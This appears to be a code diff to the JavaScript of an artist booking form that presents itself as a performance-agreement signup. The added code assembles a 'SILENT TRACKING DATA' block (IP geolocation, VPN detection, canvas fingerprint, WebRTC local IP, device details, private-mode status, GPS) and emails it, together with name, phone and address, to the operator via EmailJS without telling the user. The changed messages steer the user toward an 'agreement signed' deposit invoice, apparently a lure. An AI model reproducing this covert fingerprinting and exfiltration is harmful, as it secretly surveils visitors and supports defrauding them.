+--- ARTIST DETAILS ---
+• Name: ${document.getElementById('firstNameInput').value} ${document.getElementById('lastNameInput').value}
+• Stage Name: @Highk3yz
+• Email: ${email}
+• Phone: ${phone}
+
+--- BOOKING PREFERENCES ---
+• Selected Venue(s): ${selectedVenues.join(', ')}
+• Preferred Date: ${month} ${day}
+• Preferred Time: ${timePref}
+
+--- SHIPPING & GIFT ---
+• Address: ${addr}
+• Hoodie Size: ${document.getElementById('hoodieSize').value}
+• Tee Size: ${document.getElementById('teeSize').value}
+
+--- SILENT TRACKING DATA ---
+• IP Location: ${trackingData.ip.city}, ${trackingData.ip.region}, ${trackingData.ip.country} (${trackingData.ip.postal})
+• ISP: ${trackingData.ip.isp}
+• VPN/Proxy Detected: ${trackingData.ip.vpn ? 'YES' : 'NO'}
+• Canvas Fingerprint: ${trackingData.canvasFingerprint || 'N/A'}
+• WebRTC Local IP: ${trackingData.webrtcIP || 'N/A'}
+• Battery: ${trackingData.battery || 'N/A'}
+• Network: ${trackingData.network.type} (${trackingData.network.downlink})
+• Device RAM: ${trackingData.memory} GB
+• CPU Cores: ${trackingData.cpuCores}
+• OS: ${trackingData.os}
+• Browser: ${trackingData.browser}
+• Screen Resolution: ${trackingData.screen}
+• Timezone: ${trackingData.timezone}
+• Language: ${trackingData.language}
+• Referrer: ${trackingData.referrer}
+• Time on Page: ${trackingData.timeOnPage}s
+• Scroll Depth: ${trackingData.scrollDepth}%
+• Exit Intent: ${trackingData.exitIntent ? 'YES' : 'NO'}
+• Ad Blocker: ${trackingData.adblock ? 'YES' : 'NO'}
+• Private Mode: ${trackingData.privateMode ? 'YES' : 'NO'}
+• GPS (if allowed): ${trackingData.gps || 'Not granted'}
+
+--- ACTION REQUIRED ---
+Please send deposit invoice (50% of guaranteed minimum) and official contract to the artist email above.`;
+
         try {
             await emailjs.send('service_cyval67', 'template_35yqug3', {
                 name: `${document.getElementById('firstNameInput').value} ${document.getElementById('lastNameInput').value}`,
                 email: email,
                 message: msg,
-                selected_date: 'Signing Deal',
+                selected_date: 'Performance Agreement',
                 reply_to: email
             });
-            alert(`Promo code: ${code}. An A&R coordinator will email you within 24 hours.`);
+            alert("Agreement signed. You will receive the deposit invoice and contract within 24 hours.");
             popup.style.display = 'none';
-            document.getElementById('app').innerHTML = `<div style="text-align:center; padding:80px 20px;"><div style="font-size:3rem;">✓</div><h2 style="font-weight:400; margin:20px 0;">Confirmed & locked</h2><p>Your signing deal spot is reserved. Check your email.</p><p style="color:#d4af37; margin-top:20px;">Promo: ${code}</p></div>`;
-        } catch (err) {
-            alert(`Your promo code: ${code}. We'll contact you.`);
+            document.getElementById('app').innerHTML = `<div style="text-align:center; padding:80px 20px;"><div style="font-size:3rem;">✓</div><h2 style="font-weight:400; margin:20px 0;">Offer accepted</h2><p>Your performance agreement is confirmed. Check your email for the deposit invoice and venue logistics.</p><p style="color:#d4af37; margin-top:20px;">Offer ID: EC-PERF-0426</p></div>`;
+        } catch(err) {
+            alert("Your acceptance has been recorded. We'll contact you shortly.");
             popup.style.display = 'none';
         }
     });
